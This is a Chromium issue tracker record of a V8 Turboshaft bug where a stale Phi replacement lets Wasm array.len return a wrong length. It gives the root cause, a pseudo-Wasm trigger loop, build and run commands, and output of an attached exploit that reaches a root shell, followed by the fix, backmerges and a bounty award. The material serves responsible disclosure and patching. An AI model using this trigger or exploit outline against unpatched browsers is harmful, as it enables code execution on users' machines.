# Turboshaft: stale `PhiOp` replacement for Wasm arrays causes `array.len` bounds bypass and out-of-bounds array read/write

| Field | Value |
|-------|-------|
| **Issue ID** | [505481948](https://issues.chromium.org/issues/505481948) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turboshaft |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | pj...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2026-04-23 |
| **Bounty** | $55,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

## VULNERABILITY DETAILS

Turboshaft: stale `PhiOp` replacement for Wasm arrays causes `array.len` bounds bypass and out-of-bounds array read/write

`src/compiler/turboshaft/wasm-load-elimination-reducer.h` keeps a stale replacement for `PhiOp` across loop revisits:

```
void WasmLoadEliminationAnalyzer::ProcessPhi(OpIndex op_idx, const PhiOp& phi) {
  // ...
  if (inputs.size() > 0) {
    bool same_inputs = true;
    OpIndex first = memory_.ResolveBase(inputs.first());
    for (const OpIndex& input : inputs.SubVectorFrom(1)) {
      if (memory_.ResolveBase(input) != first) {
        same_inputs = false;
        break;
      }
    }
    if (same_inputs) {
      replacements_[op_idx] = first;
    }
  }
}

```

When all phi inputs currently resolve to the same base, `ProcessPhi` records `replacements_[op_idx] = first`. The bug is that it never clears `replacements_[op_idx]` when a later loop revisit makes `same_inputs` false. Other handlers in the same reducer do clear stale replacement state on the non-eliminated path. For example, both `WasmLoadEliminationAnalyzer::ProcessStructGet` and `WasmLoadEliminationAnalyzer::ProcessArrayLength` write:

```
replacements_[op_idx] = OpIndex::Invalid();

```

That asymmetry makes phi replacements sticky even after the merged loop state has changed.

We will explain the exploitability in details in next section.

## VERSION

V8 Version: `3d73043a08a4fc2234c973646656c9e35245b87f` (Wed Apr 22 12:22:48 2026 +0800)

## Exploit

We can craft:

1. A large array `big` and a small array `small`.
2. A mutable struct field initially containing `big`.
3. A loop containing an `if` whose merge result is either `big` or `struct.get holder.field0`.
4. A later `struct.set holder.field0 = small` on the loop backedge.
5. An `array.len` or `array.get` / `array.set` on the merged array value in the next iteration.

In pseudo-Wasm:

```
(type $arr (array (mut i32)))
(type $holder (struct (field (mut (ref $arr)))))

(func (param $n i32) (result i32)
  (local $h (ref $holder))
  (local $big (ref $arr))
  (local $small (ref $arr))
  (local $i i32)
  (local $sum i32)

  i32.const 8
  array.new_default $arr
  local.set $big

  i32.const 1
  array.new_default $arr
  local.set $small

  local.get $big
  struct.new $holder
  local.set $h

  local.get $n
  local.set $i

  loop
    local.get $i
    local.get $n
    i32.eq
    if (result (ref $arr))
      local.get $big
    else
      local.get $h
      struct.get $holder 0
    end
    array.len
    local.get $sum
    i32.add
    local.set $sum

    local.get $h
    local.get $small
    struct.set $holder 0

    local.get $i
    i32.const 1
    i32.sub
    local.tee $i
    br_if 0
  end

  local.get $sum)

```

`WasmLoadEliminationAnalyzer::ProcessWasmAllocateArray` seeds the load elimination table with the allocated array's length, and `WasmLoadEliminationAnalyzer::ProcessArrayLength` later reuses that entry through `ResolveBase(length.array())` and `memory_.FindLoadLike(...)`

1. Before the loop, `holder.field0` is known to be `big`, so the first-pass `StructGet(holder, 0)` is eliminated to `big`.
2. The `if` merge phi therefore has inputs `(big, big)` on the first pass, and `ProcessPhi` records `replacements_[phi] = big`.
3. The backedge `StructSet(holder, 0, small)` changes the tracked field from `big` to `small`, so the loop is revisited.
4. On the revisit, `StructGet(holder, 0)` is no longer eliminated from the merged snapshot and `ProcessStructGet` clears its own replacement.
5. The phi is now merging `(big, StructGet(holder, 0))`, so it is no longer equal-input. `ProcessPhi` leaves the old `replacements_[phi] = big` intact.
6. `ProcessArrayLength` still resolves the phi to `big`, so `array.len` keeps returning `8` even on iterations where the runtime array is `small` and its true length is `1`.

With that we can have the initial out-of-bounds access primitive, then we can corrupt the length of an array or simply write to another field to bootstrap `fakeobj` primitive.

**`getshell.js` is attached.**

**Note that we inlined the wasm builder for easy reproduction with clusterfuzz**

**Please scroll down to check the real exploit part**

Compile with `args.gn`:

```
dcheck_always_on = false
is_debug = false
target_cpu = "x64"
is_component_build = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_sandbox = false

```

Please run with:

```
./out.gn/x64.release/d8 --allow-natives-syntax --no-liftoff --no-wasm-loop-unrolling --no-wasm-loop-peeling getshell.js

```

expected output:

```
./out.gn/x64.release/d8 --allow-natives-syntax --no-liftoff --no-wasm-loop-unrolling --no-wasm-loop-peeling getshell.js
[*] EOF wasm builder
[*] Exploit by Project WhatForLunch
[+] victim.length corruption primed;victim[0]=0x12345678
[+] cage base: 0x00002c1300000000
[+] partition alloc: 0x00000ebc00000000
[+] code ptr table: 0x00007f75ce904000
[+] dispatch handle: 0x000000000013da00, table offset: 0x0000000000013da0
[+] rwx addr: 0x0000561be0013700
[+] 🥺 get shell
sh-5.3# echo pwned
pwned
sh-5.3# 

```

Please include a demonstration of the security bug, such as an attached HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE make the file as small as possible and remove any content not required to demonstrate the bug, or any personal or confidential information.

Please attach files directly, not in zip or other archive formats, and if you've created a demonstration site please also attach the files needed to reproduce the demonstration locally.

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: Arbitrary memory access

CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?

Reporter credit: Project WhatForLunch (@pjwhatforlunch)

## Attachments

- [getshell.js](attachments/getshell.js) (text/javascript, 95.8 KB)

## Timeline

### ch...@google.com (2026-04-23)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### dm...@chromium.org (2026-04-23)

Ah, that's unfortunate :'(

Thanks for the report!

PTAL, Jakob!

### jk...@chromium.org (2026-04-23)

Nice find, great repro. Fix in flight.

### jk...@chromium.org (2026-04-23)

We'll want to backmerge the fix to all supported channels, as the bug is around 2.5 years old ([crrev.com/c/5062838](https://crrev.com/c/5062838)).

### dx...@google.com (2026-04-23)

Project: v8/v8  

Branch:  main  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7789282>

[wasm][turboshaft] Fix Phi handling in Wasm Load Elimination

---


Expand for full commit details
```
     
    When a Phi is later found to not have all-identical inputs after 
    all, we must unset its replacement. 
     
    Fixed: 505481948 
    Change-Id: Ic9d405db231f30859f4e0f8831b2db5c76bdd622 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7789282 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106779}

```

---

Files:

- M `src/compiler/turboshaft/wasm-load-elimination-reducer.h`
- A `test/mjsunit/regress/wasm/regress-505481948.js`

---

Hash: [bb38f8914db99bd3bed6758132b104a9af00ca04](https://chromiumdash.appspot.com/commit/bb38f8914db99bd3bed6758132b104a9af00ca04)  

Date: Thu Apr 23 13:49:16 2026


---

### cl...@appspot.gserviceaccount.com (2026-04-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5261617163960320.

### ch...@google.com (2026-04-24)

The Found In field may only contain numeric values.
Some values couldn't be corrected but were removed, please verify that any important data wasn't lost.
You can see the changes by toggling full history on the issue.

### ch...@google.com (2026-04-28)

**M147** merge request created. **Please update [crbug/507381876](https://crbug.com/507381876) to have this merge reviewed.**

### ch...@google.com (2026-04-28)

**M148** merge request created. **Please update [crbug/507382339](https://crbug.com/507382339) to have this merge reviewed.**

### dx...@google.com (2026-04-28)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7800954>

[M148] [wasm][turboshaft] Fix Phi handling in Wasm Load Elimination

---


Expand for full commit details
```
     
    Original change's description: 
    > [wasm][turboshaft] Fix Phi handling in Wasm Load Elimination 
    > 
    > When a Phi is later found to not have all-identical inputs after 
    > all, we must unset its replacement. 
    > 
    > Fixed: 505481948 
    > Change-Id: Ic9d405db231f30859f4e0f8831b2db5c76bdd622 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7789282 
    > Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    > Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    > Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#106779} 
     
    (cherry picked from commit bb38f8914db99bd3bed6758132b104a9af00ca04) 
     
    Bug: 507382339,505481948 
    Change-Id: Ic9d405db231f30859f4e0f8831b2db5c76bdd622 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7800954 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#26} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/compiler/turboshaft/wasm-load-elimination-reducer.h`
- A `test/mjsunit/regress/wasm/regress-505481948.js`

---

Hash: [c3031cebc008e7178ca9fb10b2275922d6bb041c](https://chromiumdash.appspot.com/commit/c3031cebc008e7178ca9fb10b2275922d6bb041c)  

Date: Thu Apr 23 13:49:16 2026


---

### dx...@google.com (2026-04-28)

Project: v8/v8  

Branch:  refs/branch-heads/14.7  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7800955>

[M147] [wasm][turboshaft] Fix Phi handling in Wasm Load Elimination

---


Expand for full commit details
```
     
    Original change's description: 
    > [wasm][turboshaft] Fix Phi handling in Wasm Load Elimination 
    > 
    > When a Phi is later found to not have all-identical inputs after 
    > all, we must unset its replacement. 
    > 
    > Fixed: 505481948 
    > Change-Id: Ic9d405db231f30859f4e0f8831b2db5c76bdd622 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7789282 
    > Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    > Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    > Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#106779} 
     
    (cherry picked from commit bb38f8914db99bd3bed6758132b104a9af00ca04) 
     
    Bug: 507381876,505481948 
    Change-Id: Ic9d405db231f30859f4e0f8831b2db5c76bdd622 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7800955 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.7@{#44} 
    Cr-Branched-From: 723547b98d2e75cb85556ab85479688c9fbe2f1e-refs/heads/14.7.173@{#1} 
    Cr-Branched-From: 3fc49d4c4cd9e6202fe21f5925899292ffadb20a-refs/heads/main@{#105661}

```

---

Files:

- M `src/compiler/turboshaft/wasm-load-elimination-reducer.h`
- A `test/mjsunit/regress/wasm/regress-505481948.js`

---

Hash: [2cc95a7621b9a4f28509296d19ea544c2459ccf2](https://chromiumdash.appspot.com/commit/2cc95a7621b9a4f28509296d19ea544c2459ccf2)  

Date: Thu Apr 23 13:49:16 2026


---

### ch...@google.com (2026-04-29)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2026-04-29)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### jk...@chromium.org (2026-04-29)

#14: No and no; this fixes a very old memory corruption bug. Considering how small and safe the fix is, I recommend merging to M144.

### sp...@google.com (2026-05-04)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
render code execution with proof of code execution


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-06-05)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-06-05)

1. https://chromium-review.git.corp.google.com/c/v8/v8/+/7901873
2. Low - There was no conflict.
3. 147 and 148
4. Yes, the bug was introduced in 2023.

### dx...@google.com (2026-06-10)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7901873>

[M144-LTS][wasm][turboshaft] Fix Phi handling in Wasm Load Elimination

---


Expand for full commit details
```
     
    When a Phi is later found to not have all-identical inputs after 
    all, we must unset its replacement. 
     
    (cherry picked from commit bb38f8914db99bd3bed6758132b104a9af00ca04) 
     
    Fixed: 505481948 
    Change-Id: Ic9d405db231f30859f4e0f8831b2db5c76bdd622 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7789282 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#106779} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7901873 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#92} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/compiler/turboshaft/wasm-load-elimination-reducer.h`
- A `test/mjsunit/regress/wasm/regress-505481948.js`

---

Hash: [43357c8e8f9ed4c5c9b44ca9e40b6e6812c2f582](https://chromiumdash.appspot.com/commit/43357c8e8f9ed4c5c9b44ca9e40b6e6812c2f582)  

Date: Thu Apr 23 13:49:16 2026


---

### ch...@google.com (2026-07-31)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/505481948)*
